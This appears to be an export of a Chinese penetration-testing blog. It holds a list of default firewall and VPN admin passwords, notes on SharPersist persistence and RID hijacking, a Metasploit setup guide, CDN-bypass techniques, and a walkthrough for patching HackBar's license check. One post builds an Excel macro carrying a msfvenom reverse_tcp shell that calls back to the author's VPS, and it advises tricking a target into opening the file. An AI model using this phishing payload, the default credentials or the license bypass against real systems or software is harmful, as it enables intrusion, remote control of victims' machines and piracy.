    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>后渗透权限维持–SharPersist</title>
    <url>/2019/09/15/%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%93SharPersist/</url>
    <content><![CDATA[<p>我从github上下载下来，放在virscan上和virustotal上查杀了一下，以下为对比信息。</p><a id="more"></a>
<p><img src="https://i.loli.net/2019/11/11/wO5ZMFdyuTBrqV1.png" alt="9fe92f50-b724-44ac-bbaa-1c6c4878ed83-image.png"></p>
<hr>
<p><img src="https://i.loli.net/2019/11/11/8qGS4DBV7EsRKNl.png" alt="a57a5016-db3a-48b0-ab10-066c16354090-image.png"></p>
<p>结果还是不错的！</p>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>刚好我使用的也是keepass（公司规定存储密码类工具必须使用离线工具，不可在云端存放），所以试一下</p>
<p><img src="https://i.loli.net/2019/11/11/TkiPlzI9uExCOt8.png" alt="fda1efc4-477f-4112-8c27-6d50d969f22f-image.png"></p>
<p>输入命令，可以看到成功添加了</p>
<p><img src="https://i.loli.net/2019/11/11/1vAGiqNhgcj8s9W.png" alt="57ff3f5a-f36e-4fdc-8262-aeb69ba9ae38-image.png"></p>
<p>去appdata文件夹看一下，发现配置文件自动备份了</p>
<p><img src="https://i.loli.net/2019/11/11/D8UMWBQnc5ohR6d.png" alt="9d8f70ee-3a57-4325-9c99-05f19e3ffe56-image.png"></p>
<p>我用火绒查杀一下，结果如下。不知道为啥5.0火绒不显示扫描对象的路径….</p>
<p><img src="https://i.loli.net/2019/11/11/NBwkKqWfvaZb8yH.png" alt="b308d33f-c01b-4aa8-a528-d700e157ed8d-image.png"></p>
<p>我们现在来触发一下，我打开一个测试数据库。</p>
<p><img src="https://i.loli.net/2019/11/11/NuMAe5KJi4RL8gy.png" alt="ba42c02f-e2eb-4ba3-94d4-8da9fe897c44-image.png"></p>
<p>👍 成功了</p>
<p><img src="https://i.loli.net/2019/11/11/Tt4hCx3nIr8EKPR.gif" alt="测试.gif"></p>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>想从我的口袋里拿钱？不可能！——hackbar篇</title>
    <url>/2019/09/15/%E6%83%B3%E4%BB%8E%E6%88%91%E7%9A%84%E5%8F%A3%E8%A2%8B%E9%87%8C%E6%8B%BF%E9%92%B1%EF%BC%9F%E4%B8%8D%E5%8F%AF%E8%83%BD%EF%BC%81%E2%80%94%E2%80%94hackbar%E7%AF%87/</url>
    <content><![CDATA[<p>刚刚同事需要使用hackbar，但是现在都要收费了，免费的又不好用。SO。。。。干它！</p><a id="more"></a>
<h2 id="谷歌hackbar"><a href="#谷歌hackbar" class="headerlink" title="谷歌hackbar"></a>谷歌hackbar</h2><p>下载正版hackbar，然后打开详细信息页面，查看他的ID（2019.7.18日，使用的75版本的谷歌浏览器，下载的是V2.2.6的hackbar）<br><a href="https://postimg.cc/0bwLG2mb" target="_blank" rel="noopener"><img src="https://i.postimg.cc/X7H4brYc/891ca5d3-a27b-44d4-9d67-6a32c81e740b-image.png" alt="891ca5d3-a27b-44d4-9d67-6a32c81e740b-image.png"></a><br>然后进入以下目录<br><img src="https://i.loli.net/2019/11/11/N3Ow84brzPBDelh.png" alt="b422c8c2-7e57-4007-a5d5-c1828d4a0241-image.png"><br>用编辑器打开hackbar-panel.js这个文件<br><img src="https://i.loli.net/2019/11/11/1pnSVhkCwE43zW9.png" alt="b318649e-d046-4a3f-b311-522a3a53399c-image.png"><br>在40行左右（check licese代码块）你们能找到几个disable_hackbar();的字样，吧这几个disable给注释掉，然后按同样的格式加上init();<br>(注意，第一个disable_hackbar(data.message);我改成了init(data.message); ，只要把disable_hackbar换成init即可，如果里面有其他内容的依然不能变)<br>保存，重新打开浏览器，即可看到不再询问licese</p>
<h2 id="火狐hackbar"><a href="#火狐hackbar" class="headerlink" title="火狐hackbar"></a>火狐hackbar</h2><p>和 Chrome 的插件有点不一样，firefox 的插件必须是经过签名过的，才能加载到浏览器。修改插件里的任何一个字符都会导致签名失效。非签名的只能通过临时加载插件的方式，加载到浏览器里面。这里有两个替代方案。</p>
<p>方案一：<br>使用没升级前的hackbar，升级完的是2.2.2版本，找到一个2.1.3版本，没有收费代码，可以直接加载使用。<br>hackbar2.1.3版本：<a href="https://github.com/HCTYMFF/hackbar2.1.3" target="_blank" rel="noopener">https://github.com/HCTYMFF/hackbar2.1.3</a></p>
<p>使用方法：打开firefox的插件目录，然后点 “从文件安装附加组件”</p>
<p><img src="https://i.loli.net/2019/11/11/RTtfNjvS8L7EyOd.png" alt="b7f612066507530308de0bc0d8b5d293.png"><br>加载{4c98c9c7-fc13-4622-b08a-a18923469c1c}.xpi 即可</p>
<p>方案二：<br>在火狐扩展组件商店搜索 “Max hackbar” 地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://addons.mozilla.org/zh-CN/firefox/search/?q=max hackbar&amp;platform=WINNT&amp;appver=66.0.5</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/XwFO587idNM4hgU.png" alt="e263ed45-bc51-468a-9191-c5209eb6f304-image.png"><br>基本上可以替代hackbar</p>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>正向代理和反向代理</title>
    <url>/2019/09/14/%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2019/11/11/iITSPlr1HsBUhxb.png" alt="7bf65108-52e6-4925-8d83-c413397d5a2e-image.png"></p>]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试流程图</title>
    <url>/2019/09/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E5%9B%BE/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2019/11/11/r8tuMZwNdiblVJe.jpg" alt="9.jpg"></p>]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>RID劫持笔记</title>
    <url>/2019/08/29/RID%E5%8A%AB%E6%8C%81%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>RID劫持的原理就是在注册表当中（HKLM\SAM\SAM\Domains\Account\Users），将普通用户的键值修改为管理员或者其他用户的键值。以达到登录普通用户，但是可以使用的权限却为更高级的权限的目的。</p><a id="more"></a>
<hr>
<p>主要实现方法为将普通用户对应的F值中的0030处修改为高权限用户对应的F值中的0030处的值。<br>需要注意的是</p>
<p>1、注册表需要管理员权限，msf在获取metepreter的情况下也可操作</p>
<p>2、F值是低字节序，需要倒序插入</p>
<hr>
<p>建立影子用户的后续手段便是通过RID劫持来实现的。</p>
<hr>
<p>RID<br>Windows系统帐户对应固定的RID：<br>500： administrator<br>501： guest<br>502: krbtgt(域环境)<br>512: Domain Admins(域环境)<br>513: Domain Users(域环境)<br>514: Domain Guests(域环境)<br>515: Domain Computers(域环境)<br>516: Domain Controllers(域环境)</p>
<hr>
<p>tips:<br>1、F值中的0038处为用户启用开关<br>2、F值内的数据均为16进制，可根据对应值修改<br>3、RID劫持后所登入的用户，以及使用net user xxx查看到的信息都为普通用户状态，但是实际上权限为劫持对象的权限</p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>MacbookPro上安装nmap和Metasploit</title>
    <url>/2019/08/10/MacbookPro%E4%B8%8A%E5%AE%89%E8%A3%85nmap%E5%92%8CMetasploit/</url>
    <content><![CDATA[<p>这两天刚搞完牙齿，闲着也是闲着，就想着把在mac上安装一些软件的过程记录下来，话说mac还真有一点不适应。</p><a id="more"></a>
<h2 id="安装nmap："><a href="#安装nmap：" class="headerlink" title="安装nmap："></a>安装nmap：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install nmap</span><br></pre></td></tr></table></figure>
<p>homebrew是mac上的包管理器，类似于yum或apt-get。语法简称brew。<br>nmap很简单就这一条命令就好了。</p>
<h2 id="安装metasploit："><a href="#安装metasploit：" class="headerlink" title="安装metasploit："></a>安装metasploit：</h2><p>1、先从github上克隆下来，然后进入目录，执行一下程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/rapid7/metasploit-framework.git</span><br><span class="line">cd metasploit-framework</span><br><span class="line">./msfconsole</span><br></pre></td></tr></table></figure>

<p>2、执行上面的命令时，一般会报如下错误，是说明需要对bundler进行更新。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] Bundler failed to load and returned this error:     </span><br><span class="line">&apos;cannot load such file -- bundler/setup&apos;  </span><br><span class="line">[*] You may need to uninstall or upgrade bundler</span><br></pre></td></tr></table></figure>
<p>然后执行下面的命令安装新版bundler。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gem install bundler  //需要在root用户下运行</span><br></pre></td></tr></table></figure>

<p>3、别急着执行msfconsole，他依然会报错的，但是我们现在先不管他，先安装postgresql数据库。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install postgresql  //安装postgresql</span><br></pre></td></tr></table></figure>

<p>安装完之后，我们需要将其开启。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew services start postgresql //启动postgresql 服务</span><br></pre></td></tr></table></figure>

<p>然后初始化数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">initdb /usr/local/var/postgres</span><br></pre></td></tr></table></figure>
<p>在初始化时，你会看到如下报错。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">initdb: directory &quot;/usr/local/var/postgres&quot; exists but is not empty If you want to create a new database system,</span><br><span class="line"> either remove or empty the directory &quot;/usr/local/var/postgres&quot; or run initdb with an argument other than </span><br><span class="line">&quot;/usr/local/var/postgres&quot;.</span><br></pre></td></tr></table></figure>
<p>别慌，我们只要删除一个目录就好了，执行下面的删除命令之后在执行之前的初始化命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -r /usr/local/var/postgres</span><br><span class="line"></span><br><span class="line">initdb /usr/local/var/postgres</span><br></pre></td></tr></table></figure>

<p>4、为msf创建数据库用户和密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">createuser msf -P -h localhost  //输入完会叫你设置一个密码 </span><br><span class="line">createdb -O msf msf -h localhost  // 使用msf用户创建msf数据库</span><br></pre></td></tr></table></figure>

<p>完了，我们在配置一下msf的数据库连接文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd metasploit-framework/config  //进入配置文件目录</span><br><span class="line">cp database.yml.example database.yml  //复制一份database.yml</span><br><span class="line">vim database.yml  //编辑这个yml文件</span><br><span class="line">//以下为文件的配置内容，密码处填你设置的密码。</span><br><span class="line">development: &amp;pgsql   </span><br><span class="line">adapter: postgresql   </span><br><span class="line">database: msf   </span><br><span class="line">username: msf   </span><br><span class="line">password: &lt;passwd&gt;   </span><br><span class="line">host: localhost   </span><br><span class="line">port: 5432   </span><br><span class="line">pool: 200   </span><br><span class="line">timeout: 5</span><br></pre></td></tr></table></figure>

<p>5、返回msf的根目录（就是目录名字为：metasploit-framework的目录下）开始安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bundle install --path vendor/bundle</span><br></pre></td></tr></table></figure>

<p>6、OK了，应该可以正常运行可，你们可以使用下面的命令运行了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd metasploit-framework </span><br><span class="line">./msfconsole</span><br></pre></td></tr></table></figure>
<p>7、题外话，将msfconsole等命令加入环境变量，这样我们在任意目录任意位置也可以直接输入msfconsole就可以执行程序了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &apos;alias msfconsole=&quot;～path～/metasploit-framework &amp;&amp; ./msfconsole &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc</span><br><span class="line">echo &apos;alias msfbinscan=&quot;～path～/metasploit-framework &amp;&amp; ./msfbinscan &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfd=&quot;～path～/metasploit-framework &amp;&amp; ./msfd &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfelfscan=&quot;～path～/metasploit-framework &amp;&amp; ./msfelfscan &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfmachscan=&quot;～path～/metasploit-framework &amp;&amp; ./msfmachscan &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfpescan=&quot;～path～/metasploit-framework &amp;&amp; ./msfpescan &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfrop=&quot;～path～/metasploit-framework &amp;&amp; ./msfrop &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfrpc=&quot;～path～/metasploit-framework &amp;&amp; ./msfrpc &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfrpcd=&quot;～path～/metasploit-framework &amp;&amp; ./msfrpcd &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfupdate=&quot;～path～/metasploit-framework &amp;&amp; ./msfupdate &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfvenom=&quot;～path～/metasploit-framework &amp;&amp; ./msfvenom &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">sudo chmod go+w /etc/profile </span><br><span class="line">sudo echo export MSF_DATABASE_CONFIG=～path～/metasploit-framework/config/database.yml &gt;&gt; /etc/profile</span><br></pre></td></tr></table></figure>

<p>记住，一定要将上面代码中的”～path～“换成你们msf对应的目录，不然就无法生效的。还有，我这里使用的是zsh而不是bash。自己分辨环境变量文件。</p>
<h3 id="效果图："><a href="#效果图：" class="headerlink" title="效果图："></a>效果图：</h3><p><img src="https://i.loli.net/2019/11/11/JnBswT3vuDz6aeI.png" alt="屏幕快照-2019-09-01-21.51.20.png"></p>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>office漏洞复现</title>
    <url>/2019/07/29/office%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>刚刚无聊，看到有人在讲office漏洞，所以我就顺便尝试一下。<br>首先，先生成shellcode。</p><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=*.*.*.* lport=**** -f vba -o code.txt</span><br></pre></td></tr></table></figure>
<p>生成好的shellcode呢，是文本的样子的，<br><img src="https://i.loli.net/2019/11/11/eiBFgIMW8SruzQU.png" alt="image-1-1.png"></p>
<p>要把他放在office当中。我这里就直接用的excel。</p>
<p>新建一个表格，在表格选项–信任中心–信任中心选项–宏设置中，启用所有宏</p>
<p><img src="https://i.loli.net/2019/11/11/A1emIabis7Xo2tN.png" alt="image-3.png"></p>
<p>开启录制宏，并且将shellcode编辑进宏<br>一开始的文档是没有任何宏的，需要我们手动录制一个，看下图，点开录制宏，然后再停止录制就好了<br><img src="https://i.loli.net/2019/11/11/cRDMyhQwPBftVN4.png" alt="image-4.png"><br>然后点击查看宏，就可以看到有一个“”宏1“”的东西了，然后点击编辑</p>
<p><img src="https://i.loli.net/2019/11/11/bfruqYT4eQ2Zck6.png" alt="image-5.png"></p>
<p>将shellcode复制粘贴进去就好了，直接关闭掉宏窗口，他会自动保存的<br><img src="https://i.loli.net/2019/11/11/9A5wsNaHgY4XfM7.png" alt="image-6.png"></p>
<p>然后保存整个文档，他会提示以下信息<br><img src="https://i.loli.net/2019/11/11/Z5RFCpVnUYzoLAu.png" alt="image-7.png"></p>
<p>这里选择“否”，他会跳出另存为的页面，选择第二个，保存为“.xlsm”的文件即可。</p>
<p><img src="https://i.loli.net/2019/11/11/j476MnY8wQSZiIo.png" alt="image-9.png"></p>
<p>随后，在自己的VPS上监听（需要跟开始设置的shellcode配置相同的ip和端口）。</p>
<p><img src="https://i.loli.net/2019/11/11/nLc2J51MPYaKH9p.png" alt="image-11.png"></p>
<p>然后将文档发给目标，通过社工等任意方法，让其打开该文档即可反弹shell。下面是我自己打开的样子。</p>
<p><img src="https://i.loli.net/2019/11/11/9sOXM4lEAGpnJZt.png" alt="image-12.png"></p>
<p>因为该shell只有在打开文档的情况下连接，所以我就用了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
<p>来自动迁移进稳定的进程了，并且看到我的电脑用户名叫pt。拿到shell了后面的事就不在介绍了。</p>
]]></content>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>如何绕过CDN寻找真实目标IP</title>
    <url>/2019/07/16/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9E%E7%9B%AE%E6%A0%87IP/</url>
    <content><![CDATA[<p>在渗透过程中，目标站点的真实IP对我们来说是非常关键的起始点，但是现在大部分网站都会利用CDN来加速并且隐藏自己的真实IP地址。那如何寻找目标的真实IP地址？以下为网上的方法做个总结：</p><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">二级域名法</span><br><span class="line">目标网站的二级域名一般性是不会做CDN的，我们只需找到目标站点的所有二级域名，然后逐个排查，然后筛选出没有做CDN的二级域名，在本地将目标域名绑定到无CDN的二级域名IP地址，能访问说明目标站与此二级域名在同一个服务器上，或者同C段上。</span><br><span class="line"></span><br><span class="line">Nslookup法</span><br><span class="line">因国内大部分CDN运营商的服务只针对国内市场，而对国外几乎是不做CDN的，所以我们有很大的几率会直接解析到真实IP。方法1：上国外VPN ping目标域名。或者简单点的方法2：&#123; nslookup 目标域名 国外DNS &#125;。与方法1同理，就是通过国外DNS服务器查目标域名IP。使用方法二时，需要注意的是我们要同过哇哦冷门的DNS，因为像谷歌的DNS国内用的人都比较多，很多CDN运营商都把谷歌DNS作为国内市场之一，所以通过谷歌DNS查到的结果和国内差不多。方法3：查目标域名的NS记录，其域名记录的MX记录，TXT记录等很有可能指向的是真实IP。</span><br><span class="line"></span><br><span class="line">Ping法</span><br><span class="line">Ping方法使用时，应该注意命令这样写：&#123; ping xxx.com &#125; 而不是 &#123; ping www.xxx.com &#125; ，原因是现在很多CDN厂商只要求把www.xxx.com的域名别名记录到CDN主服务器上。www.xxx.com和xxx.com是两条独立的解析记录，一般只会把www.xxx.com做CDN。</span><br><span class="line">另外也可以使用国外多节点ping工具，例如just-ping，全世界几十个节点ping目标域名，很有可能找到真实IP。地址：https://asm.ca.com/en/ping.php</span><br><span class="line"></span><br><span class="line">查看历史记录</span><br><span class="line">查找域名的历史解析激励，因为域名在上CDN之前是用的IP地址，很有可能就是CDN的真实源IP地址，这里有个专门提供域名解析历史记录查询的网站，地址：https://toolbar.netcraft.com/site_report</span><br><span class="line"></span><br><span class="line">phpinfo法</span><br><span class="line">大部分网站都会放phpinfo页面，而phpinfo页面中就会显示站点的真实IP，这种方法需要看路径字典强度，或者也可以google目标站点的配置文件也可以。</span><br><span class="line"></span><br><span class="line">订阅邮件法</span><br><span class="line">有的服务器本地自带sendmail功能，注册后，会给我们发一封邮件，我们查看邮件的源代码，其中可以看到服务器的真实IP。有的大型互联网网站会有自己的邮件服务器，有可能会是处在同网段的。</span><br><span class="line"></span><br><span class="line">RSS订阅法</span><br><span class="line">通过RSS订阅一般也可以得到真实IP。</span><br><span class="line"></span><br><span class="line">图片上传法</span><br><span class="line">有的网站是支持通过URL来上传头像或图片的，我们只要放一张图片在自己的WEB服务器上，然后通过URL上传图片。之后查看网站的日志就可以找到目标站点的真实IP。</span><br></pre></td></tr></table></figure>
<p>2019.7.18补充<br>内容分发网络(content delivery network或content distribution network，缩写作CDN)指一种通过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p>
<p>CDN节点会在多个地点，不同的网络上摆放。这些节点之间会动态的互相传输内容，对用户的下载行为最优化，并借此减少内容供应者所需要的带宽成本，改善用户的下载速度，提高系统的稳定性。国内常见的CDN有ChinanNet Center（网宿科技）、ChinaCache（阿里云）等，国外常见的有Akamai(阿卡迈)、Limelight Networks（简称LLNW）等</p>
<p>用户会先经由CDN节点，然后再访问web服务器。</p>
<ul>
<li>当网站有CDN时如何查询真实IP地址</li>
</ul>
<p>1.查询历史DNS记录<br>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br>输入：baidu.com type:A 可以收集到百度的子域名和ip<br><img src="https://i.loli.net/2019/11/11/ntURxm2WKgZfOCX.png" alt="62e01ccf-2948-40d9-96b6-377fd3120523-image.png"></p>
<p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></p>
<p><img src="https://i.loli.net/2019/11/11/aq7opgInlzTyVvB.png" alt="429f53d3-9a50-4552-81d2-da49cafb8f7c-image.png"></p>
<p>输入域名后</p>
<p><img src="https://i.loli.net/2019/11/11/bsh9FSayeW7nOKL.png" alt="88236b0b-b78d-4bf4-9ddd-9df2e0de7a12-image.png"></p>
<p>可以查看历史IP<br><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a></p>
<p><a href="https://postimg.cc/Z94W4X94" target="_blank" rel="noopener"><img src="https://i.postimg.cc/nLQBYJpj/540971f0-dfd4-4b90-a790-f0db73a6b758-image.png" alt="540971f0-dfd4-4b90-a790-f0db73a6b758-image.png"></a></p>
<p><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a></p>
<p><a href="https://postimg.cc/nXtzGNGB" target="_blank" rel="noopener"><img src="https://i.postimg.cc/MpnQqScP/10f2d324-8a35-48ef-8002-1ec81222829a-image.png" alt="10f2d324-8a35-48ef-8002-1ec81222829a-image.png"></a></p>
<p>2.子域名查找法<br>因为cdn和反向代理是需要成本的，有的网站只在比较常用的域名使用cdn或反向代理，有的时候一些测试子域名和新的子域名都没来得及加入cdn和反向代理，所以有时候是通过查找子域名来查找网站的真实IP。</p>
<p>可以通过各类扫描子域名的工具来查找子域名并解析ip地址，例如子域名挖掘机，sublist3r等。</p>
<p>3.nslookup法<br>大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。其实这个方法根本不用上国外vpn，因为你上国外vpn的ping本质，就是使用国外dns（那台vpn服务器使用的dns）查询域名而已，所以只需要：nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 国外dns，就行了，例如：nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 8.8.8.8，提示：你要找冷门国外DNS才行，像谷歌的DNS，国内用的人越来越多了，很多CDN提供商都把谷歌DNS作为国内市场之一，所以，你查到的结果会和国内差不了多少。</p>
<p>或者查询域名的NS记录，其域名记录中的MX记录，TXT记录等很有可能指向的是真实ip或同C段服务器</p>
<p>4.ping法<br>ping 命令这样写 ping <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 而不是 ping www. xxx .com，ping <a href="http://xxx.com一般都会是真实IP，因为了解到现有很多CDN厂商基本只要求把" target="_blank" rel="noopener">http://xxx.com一般都会是真实IP，因为了解到现有很多CDN厂商基本只要求把</a> www. xxx .com cname到cdn主服务器上去。www. xxx .com 和 <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 是两条独立的解析记录，一般只会把 www. xxx .com 做 CDN。</p>
<p>或者使用国外的多节点ping工具，例如just-ping，全世界几十个节点ping目标域名，很有可能找到真实ip。域名：<a href="http://www.just-ping.com/。" target="_blank" rel="noopener">http://www.just-ping.com/。</a><br>5.网站漏洞查找法<br>通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实IP。</p>
<hr>
<p>另外还可以看一下P牛的文章：微信公众号-<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247491648&idx=1&sn=64d948bfc39f7122ce7aa5da63536b42&chksm=ec1dd068db6a597e27843ea34b430216b8397ac278fe6ccc1691ed6e251e51ac5e18f681b879&mpshare=1&scene=1&srcid=&sharer_sharetime=1573456653875&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=09ecea659c050ec8bed318f48239520ddc1d87fe54141e20e266a667c52bd868ba31814c794794d5ac15ab5f83488369a9c33273963afaf91a7fedd6b4cd1869e051789ca6136ba8f96c000790d9439a&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070158&lang=zh_CN&pass_ticket=0ASEAASCy9iO0BLIChJY1rNjU0BnX3nSA1%2B5OCp4nPSrf0XVss2prhA5wKdLI74Z" target="_blank" rel="noopener">信安之路</a></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>nodebb论坛搭建过程</title>
    <url>/2019/07/15/nodebb%E8%AE%BA%E5%9D%9B%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为原有的论坛升级不了（没钱买商业版的！）而且那个论坛看久了觉得又老又丑，所以打算重新搭建一个论坛。在网上找了半个月了，发现国内的程序太笨重了，还是在国外的社交网站上找到了几个，原本想搭建Flarum的论坛的，但是flarum经历了8年的开发还是bate版的，而且插件也不是很友好，就算了。重新找了一个国外比较火的nodebb。也就是我们论坛现在的程序。基于node.js的。还算可以。</p><a id="more"></a>
<p>为了搭建这个论坛，从在自己的虚拟机模拟环境到在阿里云上搭建，花了我半个月的时间吧（上班也在看这东西），其中老是找老马重置阿里云服务器也是费了不少功夫，挺麻烦了，我估摸着重置服务器大概10+次了吧，各种各样的问题都有，错一步都不行。还是辛苦老马了，无时无刻都给我提供阿里云的验证码。</p>
<p>下面的搭建步骤都是我经过十几次的错误总结出来的，因为这个程序在国内使用的组织不超过5个，所以很多网上的教程都是直接翻译外国人的，其实他们自己都看不懂自己在写什么。这套优秀的程序虽然我不懂为啥在国内火不起来（有可能是买不到nodebb的授权或者搭建很困难），但是既然被我发现了，那就要好好利用一下。</p>
<p>说到搭建困难，这套程序的每一个步骤都是非常关键的，就算是你从github上下载源码，都不一定能搭建成功，而且这个程序中很多架构是需要翻墙才能加载的，阿里云不让翻，所以我也特地把教程中所有的用到“外网”的东西全都用国内大佬特制的命令“汉化”了</p>
<p>这套教程，能卖200！别问我为什么，因为我当初快要放弃的时候，我想找人帮我搭建完事，一看，卧槽，没钱！还是自己消耗生命划算！</p>
<p><img src="https://i.loli.net/2019/11/10/I54YMEcLo6pzbqJ.png" alt="image-1-288x300.png"></p>
<p>OK,进入正文！</p>
<hr>
